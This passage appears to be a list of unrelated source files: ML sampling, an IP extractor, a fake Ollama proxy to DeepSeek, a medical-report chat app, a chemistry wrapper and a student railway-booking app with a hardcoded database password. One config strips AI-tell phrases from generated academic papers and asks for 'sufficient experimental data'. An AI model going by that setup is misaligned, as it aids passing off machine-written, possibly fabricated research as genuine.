\u043c\u0430\u0442\u0435\u0440\u0438\u0430\u043b\u043e\u0432 \u0438 \u043c\u043d\u043e\u0433\u043e\u0433\u043e \u0434\u0440\u0443\u0433\u043e\u0433\u043e.\",\n        border_style=\"yellow\",\n        width=50,\n        padding=(1, 2)\n    )\n\n    right_panel = Panel.fit(\n        \"\u2022 \u0412\u044b\u0441\u043e\u043a\u043e\u043a\u0430\u0447\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u044b\u0439 \u0441\u0438\u043d\u0442\u0435\u0437 \u0440\u0435\u0447\u0438\\n\" +\n        \"\u2022 \u0414\u0432\u0430 \u043f\u0440\u043e\u0444\u0435\u0441\u0441\u0438\u043e\u043d\u0430\u043b\u044c\u043d\u044b\u0445 \u0433\u043e\u043b\u043e\u0441\u0430\\n\" +\n        \"\u2022 \u0413\u043e\u0442\u043e\u0432\u044b\u0435 \u043f\u0440\u0435\u0441\u0435\u0442\u044b \u0434\u043b\u044f \u0440\u0430\u0437\u043d\u044b\u0445 \u0437\u0430\u0434\u0430\u0447\\n\" +\n        \"\u2022 \u0422\u043e\u0447\u043d\u0430",
    "# Copyright 2017 Google Inc.\r\n#\r\n# Licensed under the Apache License, Version 2.0 (the \"License\");\r\n# you may not use this file except in compliance with the License.\r\n# You may obtain a copy of the License at\r\n#\r\n#      http://www.apache.org/licenses/LICENSE-2.0\r\n#\r\n# Unless required by applicable law or agreed to in writing, software\r\n# distributed under the License is distributed on an \"AS IS\" BASIS,\r\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n# See the License for the specific language governing permissions and\r\n# limitations under the License.\r\n\r\n\"\"\"Returns points that minimizes the maximum distance of any point to a center.\r\n\r\nImplements the k-Center-Greedy method in\r\nOzan Sener and Silvio Savarese.  A Geometric Approach to Active Learning for\r\nConvolutional Neural Networks. https://arxiv.org/abs/1708.00489 2017\r\n\r\nDistance metric defaults to l2 distance.  Features used to calculate distance\r\nare either raw features or if a model has transform method then uses the output\r\nof model.transform(X).\r\n\r\nCan be extended to a robust k centers algorithm that ignores a certain number of\r\noutlier datapoints.  Resulting centers are solution to multiple integer program.\r\n\"\"\"\r\n\r\nfrom __future__ import absolute_import\r\nfrom __future__ import division\r\nfrom __future__ import print_function\r\n\r\nimport numpy as np\r\nfrom sklearn.metrics import pairwise_distances\r\nfrom typing import List\r\nfrom src.joydataforge.components.filter.sampling_def import SamplingMethod\r\nfrom loguru import logger\r\n\r\n\r\nclass KCenterGreedy(SamplingMethod):\r\n\r\n    def __init__(self, x: np.ndarray = None, seed: int = 0, metric: str = 'euclidean'):\r\n        self.x = x\r\n        self.flat_x = self.flatten_x()\r\n        self.name = 'k_center'\r\n        self.features = self.flat_x\r\n        self.metric = metric\r\n        self.min_distances = None\r\n        self.n_obs = self.x.shape[0]\r\n        self.already_selected = []\r\n\r\n    async def update_distances(self, cluster_centers, only_new: bool = True, reset_dist: bool = False):\r\n        \"\"\"Update min distances given cluster centers.\r\n\r\n        Args:\r\n          cluster_centers: indices of cluster centers\r\n          only_new: only calculate distance for newly selected points and update\r\n            min_distances.\r\n          rest_dist: whether to reset min_distances.\r\n        \"\"\"\r\n\r\n        if reset_dist:\r\n            self.min_distances = None\r\n        if only_new:\r\n            cluster_centers = [d for d in cluster_centers if d not in self.already_selected]\r\n        if cluster_centers:\r\n            # Update min_distances for all examples given new cluster center.\r\n            x = self.features[cluster_centers]\r\n            dist = pairwise_distances(self.features, x, metric=self.metric)\r\n            if self.min_distances is None:\r\n                self.min_distances = np.min(dist, axis=1).reshape(-1, 1)\r\n            else:\r\n                self.min_distances = np.minimum(self.min_distances, dist)\r\n\r\n    async def select_batch(self, model, already_selected: List, n: int, **kwargs):\r\n        \"\"\"\r\n        Diversity promoting active learning method that greedily forms a batch\r\n        to minimize the maximum distance to a cluster center among all unlabeled\r\n        datapoints.\r\n    \r\n        Args:\r\n          model: model with scikit-like API with decision_function implemented\r\n          already_selected: index of datapoints already selected\r\n          n: batch size\r\n        Returns:\r\n          indices of points selected to minimize distance to cluster centers\r\n        \"\"\"\r\n\r\n        try:\r\n            # Assumes that the transform function takes in original data and not\r\n            # flattened data.\r\n            logger.info('Getting transformed features...')\r\n\r\n            self.features = model.transform(self.x)\r\n            logger.info('Calculating distances...')\r\n            await self.update_distances(already_selected, only_new=False, reset_dist=True)\r\n        except:\r\n            await self.update_distances(already_selected, only_new=False, reset_dist=True)\r\n            # print('Using flat_X as features.')\r\n            # self.update_distances(already_selected, only_new=True, reset_dist=False)\r\n\r\n        new_batch = []\r\n        for _ in range(n):\r\n            if _ % 100 == 0:\r\n                logger.info(f\"k-center-index:{_}\")\r\n            if not already_selected:\r\n                # Initialize centers with a randomly selected datapoint\r\n                ind = np.random.choice(np.arange(self.n_obs))\r\n            else:\r\n                ind = np.argmax(self.min_distances)\r\n            # New examples should not be in already selected since those points\r\n            # should have min_distance of zero to a cluster center.\r\n            assert ind not in already_selected\r\n\r\n            await self.update_distances([ind], only_new=True, reset_dist=False)\r\n            new_batch.append(int(ind))\r\n        logger.info(f'Maximum distance from cluster centers is %0.2f' % max(self.min_distances))\r\n        ",
    "# -*- coding: utf-8 -*-\r\n\r\nimport pandas as pd\r\nimport os\r\nimport argparse\r\nimport ipaddress\r\n\r\ndef extract_all_tables(csv_dir, column_index, output_file):\r\n    # \u83b7\u53d6\u6307\u5b9a\u76ee\u5f55\u4e0b\u7684\u6240\u6709 CSV \u6587\u4ef6\r\n    csv_files = [os.path.join(csv_dir, f) for f in os.listdir(csv_dir) if f.endswith('.csv')]\r\n\r\n    # \u6240\u6709 CSV \u6587\u4ef6\u4e2d\u6307\u5b9a\u5217\u7684\u503c\r\n    all_values = []\r\n\r\n    # \u8bfb\u53d6\u6bcf\u4e2a CSV \u6587\u4ef6\u548c\u63d0\u53d6\u6307\u5b9a\u5217\u7684\u503c\r\n    for csv_file in csv_files:\r\n        # \u8bfb\u53d6 CSV \u6587\u4ef6\u5230 DataFrame\r\n        df = pd.read_csv(csv_file, encoding='gbk')\r\n\r\n        # \u63d0\u53d6\u6307\u5b9a\u5217\u7684\u503c\u5230 Series\r\n        column = df.iloc[:, column_index]\r\n\r\n        # \u5c06 Series \u8f6c\u6362\u4e3a\u5217\u8868\r\n        values = column.tolist()\r\n\r\n        # \u5c06\u5f53\u524d CSV \u6587\u4ef6\u7684\u503c\u6dfb\u52a0\u5230\u6240\u6709\u503c\u7684\u5217\u8868\r\n        all_values += values\r\n\r\n    # \u53bb\u91cd\r\n    all_values = set(all_values)\r\n\r\n    # \u53bb\u9664\u65e0\u6548 IP \u5730\u5740\uff0c\u5e76\u8fc7\u6ee4\u5185\u7f51 IP \u5730\u5740\r\n    valid_ips = []\r\n    for value in all_values:\r\n        try:\r\n            ip = ipaddress.ip_address(value)\r\n        except ValueError:\r\n            continue\r\n        if ip.is_private:\r\n            continue\r\n        if ipaddress.ip_network('192.168.0.0/16').overlaps(ipaddress.ip_network(value)):\r\n            continue\r\n        if ipaddress.ip_network('172.16.0.0/12').overlaps(ipaddress.ip_network(value)):\r\n            continue\r\n        if ipaddress.ip_network('10.0.0.0/8').overlaps(ipaddress.ip_network(value)):\r\n            continue\r\n        valid_ips.append(str(ip))\r\n\r\n    # \u5c06\u6240\u6709\u503c\u4fdd\u5b58\u5230\u6587\u672c\u6587\u4ef6\u4e2d\r\n    values_str = '\\n'.join(valid_ips)\r\n    with open(output_file, 'w', encoding='gbk') as f:\r\n        f.write(values_str)\r\n\r\n    print('Task End!')\r\n\r\nif __name__ == '__main__':\r\n    parser = argparse.ArgumentParser(description='Extract column values from CSV files.')\r\n    parser.add_argument('-d', '--dir', type=str, help='directory containing CSV files')\r\n    parser.add_argument('-i', '--index', type=int, help='index of the column to extract')\r\n    parser.add_argument('-o', '--output', type=str, help='output file name')\r\n    args = parser.parse_args()\r\n\r\n    if args.dir and args.index and args.output:\r\n        extract_all_tables(args.dir, args.index, args.output)\r\n    else:\r\n        parser.print_help()\r\n",
    "# -*- coding: UTF-8 -*-\n\n\"\"\" Fake Ollama Server for testing Ollama integration with Deepseek for PyCharm IDE \"\"\"\n\n# Built-in Python libraries\nimport os\nimport json\nimport logging\n\n# External Python libraries\nfrom fastapi import FastAPI, Request\nfrom fastapi.responses import JSONResponse, StreamingResponse\nimport requests\nimport uvicorn\n\n# Package Python libraries\n\nlogging.basicConfig(level=logging.INFO)\napp = FastAPI()\n\nOLLAMA_ADDRESS = os.getenv(\"OLLAMA_ADDRESS\", \"127.0.0.1\")\nOLLAMA_PORT = int(os.getenv(\"OLLAMA_PORT\", \"11434\"))\n\nAPI_URL = os.getenv(\"API_URL\", \"https://api.deepseek.com/v1/chat/completions\")\nAPI_KEY = os.getenv(\"API_KEY\", \"YOUR_API_TOKEN\")  # Retrieve the API key from the environment variable\n\nMODEL_CHAT = \"deepseek-chat\"\nMODEL_CODER = \"deepseek-coder\"\nMODEL_REASONER = \"deepseek-reasoner\"\nMODEL_METADATA = {\n    \"modified_at\": \"2024-03-15T10:00:00Z\",\n    \"size\": 12000000000,\n    \"digest\": \"abcde12345fghij67890klmno1234567890abcdef\",\n    \"details\": {\n        \"parent_model\": \"deepseek-base\",\n        \"format\": \"gguf\",\n        \"family\": \"deepseek\",\n        \"families\": [\"deepseek\"],\n    },\n}\n\nJSON_MEDIA_TYPE = \"application/json\"\nDONE_MARKER = b\"data: [DONE]\"\nDATA_PREFIX = b\"data: \"\n\n\n@app.get(\"/\")\nasync def root():\n    \"\"\"\n    Handles the root endpoint of the application.\n\n    This function is mapped to the root endpoint (\"/\") of the application\n    and returns a JSON response containing a message indicating that\n    Ollama is running. It utilizes FastAPI's asynchronous support for\n    handling HTTP requests and relies on the `JSONResponse` class for\n    sending structured JSON data as the HTTP response.\n\n    Returns\n    -------\n    JSONResponse\n        An instance of FastAPI's JSONResponse containing the message\n        indicating the application is operational.\n    \"\"\"\n    return JSONResponse(content={\"message\": \"Ollama is running\"})\n\n\ndef parse_response_line(line):\n    \"\"\"\n    Parses a single line of response from a specified format, extracting\n    details about a model's output, including message content, completion\n    status, and evaluation metrics if available.\n\n    Args:\n        line (str): The line of response to parse, expected to follow a\n            predefined format.\n\n    Returns:\n        dict or None: A dictionary containing parsed response data, including\n            the model name, assistant message content, completion status,\n            and optional evaluation metrics (token counts), or None if the\n            line does not conform to the expected format or contains errors.\n\n    Raises:\n        None explicitly. Logs errors if JSON decoding or data extraction\n        fails during processing.\n    \"\"\"\n    try:\n        if line == DONE_MARKER:\n            return None\n        if line.startswith(DATA_PREFIX):\n            response_data = json.loads(line[len(DATA_PREFIX) :])\n            if not isinstance(response_data, dict) or \"choices\" not in response_data:\n                return None\n            choices = response_data[\"choices\"]\n            if len(choices) == 0:\n                return None\n            choice = choices[0]\n            model = response_data[\"model\"]\n            content = choice[\"delta\"][\"content\"]\n            done = choice[\"finish_reason\"] == \"stop\"\n            output = {\n                \"model\": model,\n                \"message\": {\"role\": \"assistant\", \"content\": content, \"images\": None},\n                \"done\": done,\n            }\n            if done:\n                usage = response_data.get(\"usage\", {})\n                eval_count = usage.get(\"total_tokens\", 0)\n                prompt_eval_count = usage.get(\"prompt_tokens\", 0)\n                output.update({\"eval_count\": eval_count, \"prompt_eval_count\": prompt_eval_count})\n            return output\n    except (json.JSONDecodeError, KeyError) as e:\n        logging.error(f\"Failed to decode JSON or extract data: {e}, line: {line}\")\n        return None\n\n\ndef generate_streaming_response(request_payload, headers):\n    \"\"\"\n    Generate a streaming response from a POST request to a specified API endpoint.\n\n    This function sends a POST request to the provided API URL using the specified\n    headers and request payload. It streams the response line by line, parses each\n    line received, and yields the parsed response in JSON format. The function\n    is designed for scenarios where data is continuously streamed from the server\n    and needs to be processed incrementally.\n\n    Args:\n        request_payload (dict): The JSON payload to be sent in the POST request.\n        headers (dict): The headers to be included in the POST request.\n\n    Yields:\n        str: A JSON-formatted string containing the parsed response object for\n             each received line.\n    \"\"\"\n    with requests.post(API_URL, headers=headers, json=request_payload, stream=True) as response:\n        for line in response.iter_lines():\n            parsed_response = parse_response_line(line)\n            if parsed_response:\n                yield json.dumps(parsed_res",
    "\"\"\"\n\u914d\u7f6e\u7ba1\u7406\u6a21\u5757\n\"\"\"\n\nfrom dataclasses import dataclass, field\nfrom typing import List, Dict, Any\nimport os\nimport json\n\n@dataclass\nclass Config:\n    \"\"\"\u914d\u7f6e\u7c7b\"\"\"\n    \n    # AI\u914d\u7f6e\n    AI_API_KEY: str = \"\"\n    AI_MODEL: str = \"gpt-4o-mini\"\n    MAX_RETRIES: int = 3\n    RETRY_DELAY: int = 1\n    \n    # \u7cfb\u7edf\u914d\u7f6e\n    MAX_WORKERS: int = 16\n    BATCH_SIZE: int = 1000\n    MEMORY_LIMIT: int = 512  # MB\n    \n    # \u6027\u80fd\u914d\u7f6e\n    CACHE_SIZE: int = 100\n    TIMEOUT: int = 30\n    \n    # \u6587\u4ef6\u914d\u7f6e\n    INPUT_FORMATS: List[str] = field(default_factory=lambda: ['.pdf', '.txt', '.docx'])\n    OUTPUT_FORMAT: str = 'txt'\n    \n    # AI\u7279\u5f81\u6a21\u5f0f\n    PATTERNS: List[str] = field(default_factory=lambda: [\n        r'As an AI language model',\n        r'I apologize, but I',\n        r'I cannot',\n        r'I do not have',\n        r'I\\'m sorry, but',\n        r'I am not able to',\n        r'I must inform you',\n        r'Please note that',\n        r'It\\'s important to note',\n        r'I would recommend',\n        r'I suggest',\n        r'In my opinion',\n        r'Based on my understanding',\n        r'From my perspective',\n        r'As far as I know',\n        r'To the best of my knowledge'\n    ])\n    \n    # \u5904\u7406\u9009\u9879\n    OPTIONS: Dict[str, Any] = field(default_factory=lambda: {\n        'preserve_format': True,    # \u4fdd\u6301\u683c\u5f0f\n        'keep_structure': True,     # \u4fdd\u6301\u7ed3\u6784\n        'optimize_memory': True,    # \u5185\u5b58\u4f18\u5316\n        'remove_headers': True,     # \u79fb\u9664\u9875\u7709\u9875\u811a\n        'merge_paragraphs': False,  # \u5408\u5e76\u6bb5\u843d\n        'clean_spacing': True,      # \u6e05\u7406\u591a\u4f59\u7a7a\u683c\n        'normalize_quotes': True,   # \u89c4\u8303\u5316\u5f15\u53f7\n        'fix_punctuation': True,    # \u4fee\u6b63\u6807\u70b9\u7b26\u53f7\n        'remove_duplicates': True   # \u79fb\u9664\u91cd\u590d\u5185\u5bb9\n    })\n    \n    # \u8981\u79fb\u9664\u7684\u673a\u68b0\u5316\u8868\u8fbe\n    MECHANICAL_PHRASES: List[str] = field(default_factory=lambda: [\n        \"\u7136\u800c\", \"However\",\n        \"\u9996\u5148\", \"First\",\n        \"\u5176\u6b21\", \"Second\",\n        \"\u603b\u7ed3\", \"In summary\",\n        \"\u968f\u540e\", \"Subsequently\",\n        \"\u603b\u800c\u8a00\u4e4b\", \"In conclusion\",\n        \"\u6700\u540e\", \"Finally\",\n        \"\u6b64\u5916\", \"Moreover\",\n        \"\u56e0\u6b64\", \"Therefore\",\n        \"\u603b\u4e4b\", \"In general\",\n        \"\u5c24\u5176\u662f\", \"Especially\",\n        \"\u53e6\u5916\", \"Additionally\",\n        \"\u8fd9\u4e2a\", \"This\",\n        \"**\", \"*\",\n        \"\u7279\u522b\u662f\", \"Particularly\",\n        \"\u503c\u5f97\u6ce8\u610f\u7684\u662f\", \"Notably\",\n        \"\u9700\u8981\u6307\u51fa\u7684\u662f\", \"It should be noted\",\n        \"\u4e0d\u96be\u53d1\u73b0\", \"It is easy to find\",\n        \"\u901a\u8fc7\u5206\u6790\", \"Through analysis\",\n        \"\u6839\u636e\u4e0a\u8ff0\", \"Based on the above\",\n        \"\u7531\u6b64\u53ef\u89c1\", \"Thus it can be seen\",\n        \"\u7efc\u4e0a\u6240\u8ff0\", \"In summary\"\n    ])\n    \n    # OpenAI API\u914d\u7f6e\n    OPENAI_API_KEY: str = os.getenv('OPENAI_API_KEY', '')\n    \n    # \u82f1\u6587\u7cfb\u7edf\u63d0\u793a\u8bcd\n    SYSTEM_PROMPT_EN: str = \"\"\"You are a distinguished scholar who has published multiple papers in top journals like Nature/Science and serves as a senior reviewer for SCI journals. Your task is to write a high-quality academic paper in English based on the provided information.\n\nRequirements:\n\n1. Paper Quality:\n   - Deeply understand and explore the core ideas and research value\n   - Write according to the highest standards of SCI journals\n   - Demonstrate profound academic insights and innovative thinking\n   - Ensure rigorous argumentation and clear logic\n   - Use the latest research methods and theoretical frameworks\n   - Provide specific and feasible solutions\n   - Analyze the essence and impact of problems\n   - Establish systematic theoretical frameworks\n   - Provide sufficient experimental data support\n   - Conduct in-depth quantitative and qualitative analysis\n   - Demonstrate research innovation and importance\n   - Emphasize theoretical and practical value\n\n2. Writing Style:\n   - Maintain professional and rigorous academic writing style\n   - Completely avoid mechanical transition words\n   - Use natural, fluent, and elegant language\n   - Employ discipline-specific academic terminology\n   - Connect contexts naturally\n   - Drive writing with research findings\n   - Advance arguments with data and analysis\n   - Ensure terminology accuracy\n   - Maintain coherence and hierarchy in argumentation\n   - Focus on logical connections between paragraphs\n   - Emphasize progressive relationships between arguments\n\n3. Paper Structure:\n   - Title\n   - Abstract\n   - Keywords\n   - Introduction\n   - Literature Review\n   - Theoretical Framework\n   - Materials and Methods\n   - Results\n   - Discussion\n   - Practical Implications\n   - Conclusion\n   - References\n\n4. Innovation Requirements:\n   - Present original insights and viewpoints\n   - Establish new theoretical frameworks or models\n   - Discover new research questions or directions\n   - Provide unique solutions\n   - Extend boundaries of existing research\n   - Propose new research methods or tools\n   - Discover new research patterns\n   - Innovatively solve practical problems\n\n5. Academic Standards:\n   - Ensure all arguments are supported by sufficient evidence\n   - Accurately cite and review relevant literature\n   - Objectively evaluate other research\n   - Clearly state research limitations\n   - Follow academic ethical norms\n   - Maintain paper originality\n   - Ensure data authenticity and reliability\n   - Strictly follow research methods\n   - G",
    "import streamlit as st\r\nfrom parse_image import parse_image, extract_text_from_image, preprocess_image\r\nfrom utils.llm_helper import refine_text_with_llm, query_llm_with_context\r\nfrom PIL import Image\r\n\r\nst.set_page_config(layout=\"wide\")\r\n\r\n# Custom CSS to improve the layout\r\nst.markdown(\"\"\"\r\n    <style>\r\n    .main > div {\r\n        padding-top: 2rem;\r\n    }\r\n    .block-container {\r\n        padding-top: 1rem;\r\n        padding-bottom: 1rem;\r\n    }\r\n    </style>\r\n    \"\"\", unsafe_allow_html=True)\r\n\r\n# Title centered at the top\r\nst.title(\"Enhanced Medical Report Parser and Chat Assistant\")\r\n\r\n# Create two columns for the layout\r\nleft_col, right_col = st.columns([1, 1])\r\n\r\n# Initialize session state\r\nif 'refined_text' not in st.session_state:\r\n    st.session_state.refined_text = None\r\nif 'chat_history' not in st.session_state:\r\n    st.session_state.chat_history = []\r\nif 'submitted' not in st.session_state:\r\n    st.session_state.submitted = False\r\n\r\n# Callback for form submission\r\ndef handle_submit():\r\n    st.session_state.submitted = True\r\n\r\n# Left column - Image Upload and Processing\r\nwith left_col:\r\n    st.header(\"Upload Medical Report\")\r\n    \r\n    # File uploader\r\n    uploaded_file = st.file_uploader(\r\n        \"Upload a medical report image\",\r\n        type=[\"png\", \"jpg\", \"jpeg\"],\r\n        help=\"Select a clear image of your medical report\"\r\n    )\r\n    \r\n    if uploaded_file:\r\n        # Display the uploaded image\r\n        image = Image.open(uploaded_file)\r\n        image.save(\"uploaded_image.png\")\r\n        st.image(image, caption=\"Uploaded Report\", use_column_width=True)\r\n        \r\n        with st.spinner(\"Processing report...\"):\r\n            try:\r\n                # Parse the image\r\n                parsed_sections = parse_image(\"uploaded_image.png\")\r\n                \r\n                if parsed_sections:\r\n                    # Create an expander for parsed sections\r\n                    with st.expander(\"View Parsed Sections\", expanded=False):\r\n                        for section, df in parsed_sections.items():\r\n                            st.subheader(section)\r\n                            st.dataframe(df, use_container_width=True)\r\n                    \r\n                    # Combine parsed text for context\r\n                    st.session_state.refined_text = \"\\n\".join(\r\n                        f\"{section}:\\n{df.to_string(index=False)}\"\r\n                        for section, df in parsed_sections.items()\r\n                    )\r\n                    \r\n                else:\r\n                    st.warning(\"Structured parsing failed. Using OCR and LLM fallback...\")\r\n                    raw_text = extract_text_from_image(preprocess_image(\"uploaded_image.png\"))\r\n                    st.session_state.refined_text = refine_text_with_llm(raw_text)\r\n                    \r\n                    with st.expander(\"View Extracted Text\", expanded=False):\r\n                        st.text(st.session_state.refined_text)\r\n                \r\n                st.success(\"Report processed successfully!\")\r\n                \r\n            except Exception as e:\r\n                st.error(f\"An error occurred: {str(e)}\")\r\n                st.session_state.refined_text = None\r\n\r\n# Right column - Chat Interface\r\nwith right_col:\r\n    st.header(\"Chat with Your Report\")\r\n    \r\n    if st.session_state.refined_text:\r\n        # Add a brief instruction\r\n        st.markdown(\"\"\"\r\n            Ask questions about your medical report. For example:\r\n            - What are the key findings?\r\n            - Explain the test results\r\n            - What are the recommended actions?\r\n        \"\"\")\r\n        \r\n        # Display chat history\r\n        for q, a in st.session_state.chat_history:\r\n            st.info(f\"You: {q}\")\r\n            st.success(f\"Assistant: {a}\")\r\n        \r\n        # Chat form\r\n        with st.form(key=\"chat_form\", clear_on_submit=True):\r\n            user_query = st.text_input(\"Type your question here:\")\r\n            submit_button = st.form_submit_button(\"Send\", on_click=handle_submit)\r\n        \r\n        # Process the query after form submission\r\n        if st.session_state.submitted:\r\n            if user_query:  # Only process if there's actually a query\r\n                with st.spinner(\"Generating response...\"):\r\n                    response = query_llm_with_context(st.session_state.refined_text, user_query)\r\n                    st.session_state.chat_history.append((user_query, response))\r\n            st.session_state.submitted = False\r\n            st.rerun()\r\n        \r\n        # Clear chat button\r\n        if st.button(\"Clear Chat History\"):\r\n            st.session_state.chat_history = []\r\n            st.rerun()\r\n    \r\n    else:\r\n        st.info(\"Please upload a medical report to start chatting.\")",
    "# -*- coding: utf-8 -*-\n__author__ = 'LiYuanhe'\n\nfrom Lib import *\n\n# TODO: Allow for custom input\nsolvent = \"CH2Cl2\"\n\n\n# Test this program like:\n# python Process_Job.py \"E:\\My_Program\\xTB_in_Chem3D\\Tests\\ethane.mop\" \"ethane\" \"E:\\My_Program\\xTB_in_Chem3D\\Process_Job.py\"\n\ndef call_xtb(mopac_file, output_folder):\n    xTB_run_path = filename_remove_append(temp_input_file)\n    xyz_filepath = mopac_file + '.xyz'\n    out_file = os.path.join(xTB_run_path, 'Run_xTB.out')\n    molden_file = os.path.join(xTB_run_path, 'molden.input')\n    xtbopt_xyz_file = os.path.join(xTB_run_path, 'xtbopt.xyz')\n\n    charge = 0\n    multiplicity = 1\n    GFN_label = \"GFN2\"\n    GFN = [\"--gfn\", \"2\"]\n\n    mopac_file_content = open(mopac_file).read().splitlines()\n\n    command_line = mopac_file_content[0].lower()\n    charge_re_ret = re.findall(r\"charge\\=(-*\\d+)\", command_line)\n    is_triplet = \"triplet\" in command_line\n    MS_setting = re.findall(r\"ms\\=(-*\\d+\\.*\\d*)\", command_line)\n    if MS_setting:\n        multiplicity = int(abs(float(MS_setting[0])) * 2 + 1)\n    if MS_setting and is_triplet:\n        print(\"\\n\\nYou should not set MS and TRIPLET at the same time.\\n\\n\")\n        sys.exit(1)\n    GFN_keywords = {\"GFN2\": [\"--gfn\", \"2\"],\n                    \"GFN1\": [\"--gfn\", \"1\"],\n                    \"GFN0\": [\"--gfn\", \"0\"],\n                    \"GFNFF\": [\"--gfnff\"]}\n    for i in GFN_keywords:\n        if i.lower() in command_line:\n            GFN_label = i\n            GFN = GFN_keywords[i]\n\n    if charge_re_ret:\n        charge = int(charge_re_ret[0])\n    regex_pattern = r\"^([A-Z][a-z]{0,2})\\s+(-*\\d+\\.\\d*)\\s+\\d+\\s+(-*\\d+\\.\\d*)\\s+\\d+\\s+(-*\\d+\\.\\d*)\"\n    coordinates = []\n    elements = []\n    for i in mopac_file_content:\n        if re_ret := re.findall(regex_pattern, i):\n            re_ret = re_ret[0]\n            if re_ret[0] in element_to_num_dict:\n                elements.append(element_to_num_dict[re_ret[0]])\n                coordinates.append(re_ret)\n\n    total_electron = sum(elements) - charge\n    if total_electron % 2 == 1:\n        multiplicity = 2\n    if is_triplet:\n        multiplicity = 3\n\n    print(f\"Charge: {charge}; Multiplicity: {multiplicity}\")\n\n    xyz_file_content = f\"{len(coordinates)}\\n{mopac_file}\\n\" + \"\\n\".join(\"\\t\".join(atom) for atom in coordinates) + '\\n'\n    with open(xyz_filepath, 'w') as xyz_filepath_object:\n        xyz_filepath_object.write(xyz_file_content)\n\n    os.makedirs(xTB_run_path, exist_ok=True)\n    print(\"Running xTB in:\", xTB_run_path)\n    os.chdir(xTB_run_path)\n\n    print(\"Running for:\", out_file, \"...\")\n    xTB_command = [xTB_bin, xyz_filepath, '--opt', 'vtight', \"--chrg\", str(charge), \"--alpb\", solvent, '--uhf', str(multiplicity - 1), \"--molden\"] + GFN\n    print(\"Command args:\", \" \".join(xTB_command))\n\n    # \u4e0d\u77e5\u9053\u5982\u4f55\u540c\u65f6\u8f93\u51fa\u5230stdout\u548cfile stream\uff0c\u53cd\u6b63\u5f88\u5feb\uff0c\u76f4\u63a5\u8dd1\u4e24\u904d\u7b97\u4e86\n    process = subprocess.Popen(xTB_command, stdout=open(out_file, 'w'))\n    subprocess.call(xTB_command)\n\n    process.wait()\n\n    if not os.path.isfile(xtbopt_xyz_file):\n        print(\"\\n\\n\\nxTB calculation failed.\\n\\n\")\n        sys.exit(1)\n\n    with open(xtbopt_xyz_file) as xtbopt_xyz_file_object:\n        xtbopt_xyz_file_content = xtbopt_xyz_file_object.read().splitlines()\n\n    output_coordinate_lines = []\n    electronic_energy = None\n    for line in reversed(xtbopt_xyz_file_content):\n        if not re.findall(r\"^([A-Z][a-z]{0,2})\\s+(-*\\d+\\.\\d*)\\s+(-*\\d+\\.\\d*)\\s+(-*\\d+\\.\\d*)\", line):\n            electronic_energy = re.findall(r'energy\\: (-*\\d+\\.\\d*)', line)[0]\n            electronic_energy = float(electronic_energy) * 2625.49962\n            break\n        output_coordinate_lines.append(line)\n    if electronic_energy is None:\n        raise Exception(\"Electronic Energy Not Found.\")\n    out_xyz_filename = os.path.join(output_folder,\n                                    input_filename_stem +\n                                    \"_[\" + GFN_label + \" = {:.1f}\".format(electronic_energy) + f\" kJ_mol]_[Chg {charge}]_[Mult {multiplicity}].xyz\")\n\n    with open(out_xyz_filename, 'w') as output_gjf_file_object:\n        output_gjf_file_object.write(f\"{len(output_coordinate_lines)}\\n\\n\" +\n                                     \"\\n\".join(reversed(output_coordinate_lines)))\n\n    out_sdf_filename = filename_replace_last_append(out_xyz_filename, 'sdf')\n    print(\"Output SDF file:\", out_sdf_filename)\n    os.environ['BABEL_DATADIR'] = os.path.join(executable_directory, \"OpenBabel\", 'data')\n    subprocess.call([os.path.join(executable_directory, \"OpenBabel\", 'obabel.exe'), '-ixyz', out_xyz_filename, \"-osdf\", '-O', out_sdf_filename])\n\n    return out_sdf_filename, out_file, multiplicity, molden_file\n\n\nif __name__ == '__main__':\n    if sys.argv[0].lower().endswith('python') or sys.argv[0].lower().endswith('python.exe') or sys.argv[0].lower().endswith('cmd'):\n        temp_input_file = sys.argv[2]\n        input_filename_stem = sys.argv[3]\n        executable_directory = filename_parent(sys.argv[4])\n    else:\n        temp_input_file = sys.argv[1]\n        input_filename_stem = sys.argv[2]\n        exe",
    "import mysql.connector as mycon\nmydb=mycon.connect(host=\"localhost\",user=\"root\",password=\"1234\")\nmycur=mydb.cursor()\nfrom datetime import date\nimport random as ra\n\ndef create_database():\n    mycur.execute(\"create database if not exists RAILWAY\")\ncreate_database()\n\ndef create_table():\n    mycur.execute(\"use railway \")\n    mycur.execute(\"create table if not exists details( username varchar(50) ,pass varchar(50),phone char(10) primary key)\")\ncreate_table()\n\ndef details():\n    mycur.execute(\"use railway \")\n    mycur.execute(\"show tables\")\n    rec=mycur.fetchall()\n    for i in rec:\n        print(i)\n\n        \ndef details_():\n    mycur.execute(\"use railway \")\n    mycur.execute(\"select * from details\")\n    rec=mycur.fetchall()\n    for i in rec:\n        print(i)\n#-----------------------------------------------------------MAIN 2----------------------------------------------------\ndef main():\n    print(\"\\n\")\n    print(\"1 BOOK TICKET -\")\n    print(\"2 CANCEL TICKET -\")\n    print(\"3 UPDATE YOUR PROFILE -\")\n    print(\"4 TRAIN DETAILS -\")\n    print(\"5 VIEW TICKET -\")\n    print(\"6 ISSUE -\")\n    print(\"7 FOOD SECTION -\")\n    print(\"8 LOG OUT -\")\n    print(\"9 GO TO HOME PAGE -\")\n    print(\"\\n\")\n    c2=int(input(\"ENTER YOUR CHOICE :\"))\n    if c2==1:\n        booking()\n    elif c2==2:\n        cancel()\n    elif c2==3:\n        up_profile()\n    elif c2==4:\n        mapp()\n    elif c2==5:\n        view()\n    elif c2==6:\n        issue()\n    elif c2==7:\n        food_de()\n    elif c2==8:\n        ex()\n    elif c2==9:\n        log_sign()\n    else:\n        print(\"INVALID INPUT :\")\n        main()\n#---------------------------------------------INSERT-----------------------------------------------------------        \ndef insert():\n    global ph\n    global pas\n    print(\" \u2705\"*23)\n    mycur=mydb.cursor()\n    mycur.execute(\"use railway\")\n    usename=input(\"ENTER YOUR USER NAME :\")\n    phone=input(\"ENTER YOUR PHONE NUMBER :\")\n    password=input(\"ENTER YOUR PASSWORD :\")\n    c_pass=input(\"ENTER YOUR PASSWORD AGAIN :\")\n    if password!=c_pass:\n        print(\"WRONG PASSWORD\")\n        insert()\n    elif len(str(password))<8:\n        print(\"\\n\")\n        print(\"ENTER ATLEAST 8 DIGIT PASSWORD\")\n        print(\"\\n\")\n        insert()\n    elif len(str(phone))!=10:\n            print(\"ENTER 10 DIGIT PHONE NUMBER :\")\n            insert()\n    else:\n        r1=ra.randrange(10,20)\n        r2=ra.randrange(10,20)\n        print(\"PROVE 